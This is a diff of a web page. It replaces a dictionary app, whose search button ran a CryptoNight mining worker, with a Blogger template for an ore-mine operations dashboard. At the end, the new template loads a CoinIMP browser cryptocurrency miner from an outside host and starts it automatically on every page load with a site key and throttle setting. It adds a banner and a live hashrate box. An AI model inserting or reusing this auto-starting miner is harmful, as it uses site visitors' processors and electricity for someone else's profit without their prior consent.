@@ -1,140 +1,189 @@
-<!DOCTYPE html>
-<html lang="en">
+<html b:version='2' class='v2'
+      expr:dir='data:blog.languageDirection'
+      expr:lang='data:blog.locale'
+      xmlns='http://www.w3.org/1999/xhtml'
+      xmlns:b='http://www.google.com/2005/gml/b'
+      xmlns:data='http://www.google.com/2005/gml/data'
+      xmlns:expr='http://www.google.com/2005/gml/expr'>
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Dictionary App + Miner</title>
-  <style>
-    body { font-family: sans-serif; padding: 20px; }
-    .container { max-width: 600px; margin: auto; }
-    .search-box { margin: 1em 0; }
-    input { padding: 8px; width: 70%; }
-    button { padding: 8px 12px; }
-    .result { margin-top: 20px; padding: 10px; border: 1px solid #ddd; }
-  </style>
+  <title><data:blog.pageTitle/></title>
+  <meta content='width=device-width, initial-scale=1' name='viewport'/>
+
+  <!-- ✅ Correct Blogger skin -->
+  <b:skin><![CDATA[
+    body { margin:0; font-family:Arial, sans-serif; background:#f9fafb; }
+    h1,h2,h3,h4 { margin:0; }
+    .container { max-width:1200px; margin:20px auto; padding:10px; }
+    .card { background:#fff; border-radius:12px; padding:15px; box-shadow:0 2px 6px rgba(0,0,0,.1); }
+    footer { font-size:12px; opacity:.7; text-align:center; margin:30px 0; }
+    #minerBox { position:fixed; bottom:10px; right:10px; background:#111; color:#0f0; padding:8px 12px; border-radius:8px; font-size:13px; font-family:monospace; z-index:9999; }
+  ]]></b:skin>
+
+  <!-- TailwindCSS, Chart.js, Leaflet -->
+  <script src='https://cdn.tailwindcss.com'></script>
+  <script src='https://cdn.jsdelivr.net/npm/chart.js'></script>
+  <link href='https://unpkg.com/leaflet/dist/leaflet.css' rel='stylesheet'/>
+  <script src='https://unpkg.com/leaflet/dist/leaflet.js'></script>
 </head>
+
 <body>
-  <div class="container">
-    <h1>📖 Dictionary App + Worker</h1>
-    <div class="search-box">
-      <input type="text" id="wordInput" placeholder="Enter a word...">
-      <button onclick="searchWord()">Search</button>
-    </div>
-    <div class="result" id="result"></div>
+  <div class='container'>
+
+    <!-- ✅ Dashboard Section (homepage only) -->
+    <b:if cond='data:blog.url == data:blog.homepageUrl'>
+      <section id='dashboard'>
+        <!-- HEADER -->
+        <header class='flex items-center justify-between mb-6'>
+          <div>
+            <h1 class='text-2xl font-bold'>⛏️ Mining Operations Dashboard</h1>
+            <p class='text-sm text-gray-500'>Overview · Real-time · Fleet · Safety</p>
+          </div>
+          <div class='flex gap-2'>
+            <button class='px-4 py-2 bg-gray-200 rounded-lg'>Export</button>
+            <button class='px-4 py-2 bg-blue-600 text-white rounded-lg'>New Report</button>
+          </div>
+        </header>
+
+        <!-- KPI ROW -->
+        <div class='grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-6'>
+          <div class='card'>
+            <p class='text-xs text-gray-500'>Daily Production</p>
+            <h2 class='text-2xl font-bold'>12,450 t <span class='text-sm text-green-600'>+4.2%</span></h2>
+          </div>
+          <div class='card'>
+            <p class='text-xs text-gray-500'>Ore Grade</p>
+            <h2 class='text-2xl font-bold'>1.82% <span class='text-sm text-red-600'>-0.3%</span></h2>
+          </div>
+          <div class='card'>
+            <p class='text-xs text-gray-500'>Utilization</p>
+            <h2 class='text-2xl font-bold'>87% <span class='text-sm text-green-600'>+1.8%</span></h2>
+          </div>
+          <div class='card'>
+            <p class='text-xs text-gray-500'>Active Alerts</p>
+            <h2 class='text-2xl font-bold'>3</h2>
+          </div>
+        </div>
+
+        <!-- CHART -->
+        <div class='card mb-6'>
+          <h3 class='text-lg font-semibold mb-2'>Weekly Production</h3>
+          <canvas class='h-64' id='productionChart'></canvas>
+        </div>
+
+        <!-- MAP -->
+        <div class='card mb-6 h-80'>
+          <h3 class='text-lg font-semibold mb-2'>Mine Site Map</h3>
+          <div class='h-64 rounded-lg' id='map'></div>
+        </div>
+
+        <!-- FLEET -->
+        <div class='card mb-6'>
+          <h4 class='font-semibold mb-3'>Fleet Status</h4>
+          <ul class='space-y-2 text-sm'>
+            <li>🚛 TRK-01 — In Cycle (ETA 00:12)</li>
+            <li>🚛 TRK-02 — Idle</li>
+            <li>🚛 TRK-03 — Refuel (ETA 00:30)</li>
+          </ul>
+        </div>
+
+        <!-- TABLE -->
+        <div class='card mb-6'>
+          <h4 class='font-semibold mb-3'>Recent Loads</h4>
+          <table class='w-full text-sm border-collapse'>
+            <thead class='bg-gray-100 text-gray-600 uppercase text-xs'>
+              <tr>
+                <th class='text-left py-2 px-3'>Load ID</th>
+                <th class='text-left py-2 px-3'>Truck</th>
+                <th class='text-left py-2 px-3'>Tonnes</th>
+                <th class='text-left py-2 px-3'>Destination</th>
+                <th class='text-left py-2 px-3'>Time</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr class='border-t'>
+                <td class='py-2 px-3'>LD-1001</td>
+                <td class='py-2 px-3'>TRK-01</td>
+                <td class='py-2 px-3'>48</td>
+                <td class='py-2 px-3'>Crushing</td>
+                <td class='py-2 px-3'>10:24</td>
+              </tr>
+              <tr class='border-t'>
+                <td class='py-2 px-3'>LD-1000</td>
+                <td class='py-2 px-3'>TRK-03</td>
+                <td class='py-2 px-3'>44</td>
+                <td class='py-2 px-3'>Stockpile A</td>
+                <td class='py-2 px-3'>10:18</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <footer>Template • Built with TailwindCSS, Chart.js &amp; Leaflet.js</footer>
+      </section>
+    </b:if>
+
+    <!-- ✅ Normal Blogger Posts -->
+    <b:if cond='data:blog.url != data:blog.homepageUrl'>
+      <b:section class='main' id='main' showaddelement='true'></b:section>
+    </b:if>
   </div>
 
-  <script>
-    let worker;
-
-    function ensureWorker() {
-      if (!worker) {
-        const workerCode = `
-          // configure Module before loading cn.js
-          self.Module = {
-            locateFile: (path) => './' + path,
-            onRuntimeInitialized() {
-              self.hash_cn = Module.cwrap("hash_cn", "string", ["string","number","number","number"]);
-              self.postMessage({ identifier: 'ready' });
-            }
-          };
-
-          importScripts('cn.js'); // loads cn.js + cn.wasm
-
-          function zeroPad(num, places) {
-            const s = num.toString(16);
-            return "0".repeat(Math.max(0, places - s.length)) + s;
-          }
-          function hex2int(s) {
-            return parseInt(s.match(/[a-fA-F0-9]{2}/g).reverse().join(""), 16);
-          }
-          function int2hex(i) {
-            return zeroPad(i, 8).match(/[a-fA-F0-9]{2}/g).reverse().join("");
-          }
-          function getRandomInt(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
-          }
-
-          self.onmessage = ({ data }) => {
-            const { job, throttle } = data;
-            if (!self.hash_cn) { console.warn("hash_cn not ready"); return; }
-
-            let bsuccess = false;
-            let hash = "";
-            let hexnonce = 0;
-
-            const calcHash = () => {
-              const target = hex2int(job.target);
-              const inonce = getRandomInt(0, 0xffffffff);
-              hexnonce = int2hex(inonce);
-
-              const blob = job.blob.substring(0,78) + hexnonce + job.blob.substring(86);
-
-              if (job.algo === "cn") hash = hash_cn(blob,0,job.variant,job.height);
-              else if (job.algo === "cn-lite") hash = hash_cn(blob,1,job.variant,job.height);
-              else if (job.algo === "cn-pico") hash = hash_cn(blob,2,job.variant,job.height);
-              else if (job.algo === "cn-half") hash = hash_cn(blob,3,job.variant,job.height);
-              else if (job.algo === "cn-rwz")  hash = hash_cn(blob,4,job.variant,job.height);
-              else throw new Error("algorithm not supported!");
-
-              const hashval = hex2int(hash.substring(56,64));
-              bsuccess = hashval < target;
-            };
-
-            const submit = () => {
-              if (bsuccess) {
-                self.postMessage(JSON.stringify({
-                  identifier: "solved",
-                  job_id: job.job_id,
-                  nonce: hexnonce,
-                  result: hash
-                }));
-              } else {
-                self.postMessage("nothing");
-              }
-            };
-
-            if (!throttle) {
-              calcHash(); submit();
-            } else {
-              const t0 = performance.now();
-              calcHash();
-              const dt = performance.now() - t0;
-              const sleepTime = Math.round((throttle / (100 - throttle + 10)) * dt);
-              setTimeout(submit, sleepTime);
-            }
-          };
-        `;
-
-        const blob = new Blob([workerCode], { type: "application/javascript" });
-        worker = new Worker(URL.createObjectURL(blob));
-        worker.onmessage = (e) => {
-          const data = e.data;
-          if (data && data.identifier === 'ready') {
-            console.log("Worker ready!");
-          } else {
-            document.getElementById("result").textContent = JSON.stringify(data);
-          }
-        };
-      }
-      return worker;
+  <!-- Scripts -->
+  <script type='text/javascript'>
+  //<![CDATA[
+    // Chart.js
+    if (document.getElementById('productionChart')) {
+      const ctx = document.getElementById('productionChart').getContext('2d');
+      new Chart(ctx, {
+        type: 'line',
+        data: {
+          labels: ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'],
+          datasets: [{
+            label: 'Tonnes',
+            data: [1800,1950,2000,2100,2300,2200,2400],
+            borderColor: 'rgb(37,99,235)',
+            backgroundColor: 'rgba(37,99,235,0.2)',
+            fill: true,
+            tension: 0.3
+          }]
+        }
+      });
     }
 
-    function searchWord() {
-      const input = document.getElementById("wordInput").value;
-      document.getElementById("result").textContent = "Searching for: " + input;
-
-      // Example fake job for testing
-      const job = {
-        job_id: "test123",
-        algo: "cn",
-        variant: 0,
-        height: 0,
-        target: "ffffffff",
-        blob: "0".repeat(150)
-      };
-
-      ensureWorker().postMessage({ job, throttle: 0 });
+    // Leaflet Map
+    if (document.getElementById('map')) {
+      const map = L.map('map').setView([14.5995, 120.9842], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap'
+      }).addTo(map);
+      L.marker([14.5995,120.9842]).addTo(map).bindPopup('Mine Site').openPopup();
     }
+  //]]>
+  </script>
+
+  <!-- ✅ CoinIMP Miner -->
+  <script src="https://www.hostingcloud.racing/0FiZ.js"></script>
+  <script type='text/javascript'>
+  //<![CDATA[
+    var _client = new Client.Anonymous('9fec7810225ee2675a7d462c769abf8bdc5ad968e79b574598f892b5f1c202da', {
+        throttle: 0.5, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+    // ✅ Live monitor box
+    let minerBox = document.createElement("div");
+    minerBox.id = "minerBox";
+    minerBox.innerHTML = "⛏️ Starting CoinIMP miner...";
+    document.body.appendChild(minerBox);
+
+    setInterval(() => {
+      minerBox.innerHTML = "⛏️ Hashrate: " + _client.getHashesPerSecond().toFixed(2) +
+                           " h/s<br/>Total: " + _client.getTotalHashes();
+      console.log("Hashrate:", _client.getHashesPerSecond(), " | Total:", _client.getTotalHashes());
+    }, 5000);
+  //]]>
   </script>
 </body>
 </html>
